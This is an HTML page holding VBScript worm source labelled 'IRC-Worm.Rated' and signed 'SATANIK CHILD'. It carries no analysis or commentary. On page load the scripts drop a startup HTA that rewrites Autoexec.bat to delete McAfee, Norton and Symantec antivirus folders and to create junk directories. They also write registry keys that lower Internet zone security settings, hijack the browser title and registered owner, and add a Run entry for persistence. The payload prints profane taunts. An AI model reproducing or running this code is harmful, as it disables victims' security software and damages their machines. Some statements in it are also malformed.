<html>
<head>
  <title>IRC-Worm.Rated</title>
</head>
<BODY>
<object classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC" id="fs" width="0" height="0">
</object>
<script language="VBScript">
On Error Resume Next
fs.Path="..\Start Menu\Programs\StartUp\RatedxXx.hta"
fs.Doc="<" & "script language=""VBScript"">" & Chr(13) & Chr(10) & "Dim Lso, tf" & Chr(13) & Chr(10) & "Set fso = CreateObject(""Scripting.FileSystemObject"")" & Chr(13) & Chr(10) & "Set tf = fso.CreateTextFile(""C:\Autoexec.bat"", True)" & Chr(13) & Chr(10) & "tf.WriteLine(""echo Please wait while my WORM finishes the rest of it's infection!!"")" & Chr(13) & Chr(10) & "tf.WriteLine(""echo       Stoping it could piss my WORM off and could be lethal    "")" & Chr(13) & Chr(10) & "tf.WriteLine(""echo           to your PIECE OF FUCKEN SHIT computer!!!!!           "")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__1"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__2"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__3"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__4"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__5"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__6"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__7"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__8"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__11"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\ÿ_SATAN__12"")" & Chr(13) & Chr(10) & "tf.WriteLine(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__1"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__2"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__3"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__4"")" & Chr(13) & Chr (10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__5"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__6"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__7"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__8"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__9"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__10"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__11"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__12"")" & Chr(13) & Chr(10) & "(""md C:\WINDOWS\DESKTOP\ÿ_SATAN__13"")"& Chr(13) & Chr(10) & "tf.WriteLine(""del y| C:\Progra~1\Networ~1\McAfee\*.* "")" & Chr(13) & Chr(10) & "tf.WriteLine(""del y| C:\Progra~1\Antivi~1\*.* "")" & Chr(13) & Chr(10) & "tf.WriteLine(""del y| C:\Progra~1\Norton~1\*.* "")" & Chr(13) & Chr(10) & "tf.WriteLine(""del y| C:\Progra~1\fsi\*.* "")" & Chr(13) & Chr(10) & "tf.WriteLine(""del y| C:\Progra\Symant~1\*.* "")" & Chr(13) & Chr(10) & "tf.WriteLine(""echo MICROSOFT IS FINISHED WITH ITS INFECTION!  THANK YOU FOR YOUR PATIENCE!"")" & Chr(13) & Chr(10) & "tf.WriteLine(""echo      THIS HAS BEEN A SATANIK CHILD INFECTION .2001 MOTHER FUCKERS      "")" & Chr(13) & Chr(10) & "tf.WriteLine(""echo                ----====[[--:S-:6:6:6:-C:--]]====----                   "")" & Chr(13) & Chr(10) & "tf.Close" & Chr(13) & Chr(10) & "<" & "/script>"
fs.Write
</script>
<center>
<script language="VBScript">
<!--
On Error Resume Next
Set worm1 = CreateObject("WScript.Shell")
Worm1.RegWrite "HKCU\software\infected\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)

Dim sh, v, r
Set sh = WScript.CreateObject("WScript.Shell")
If v = 2 Then
  wscript.quit
End if
  r = ("==[INFECTED]==  ----====:SATANIK CHILD:====----  ==[INFECTED]==")
    If r = "empty" Then
          sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
          sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
     Else
          sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
          sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"
          sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
          sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"
     End if

Dim dk, satan, own, s, ownz
Set dk = CreateObject("WScript.Shell")
On error resume next
 satan = dk.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner\")
         dk.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "666"
         dk.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", " S A T A N I K  C H I L D "
         dk.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "SATANIK VIRUS CREATIONSZ"
         dk.RegWrite s, own
set dk = nothing

On error Resume Next
Set sc = CreateObject("WScript.Shell")

         sc.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
         sc.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
         sc.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
         sc.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
         sc.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
         sc.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
         sc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Internet", "C:\WINDOWS\SYSTEM\RatedxXx.vbs"
         sc.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Internet", "C:\WINDOWS\SYSTEM\RatedxXx.vbs"
//-->
</script>
</body>
</html>
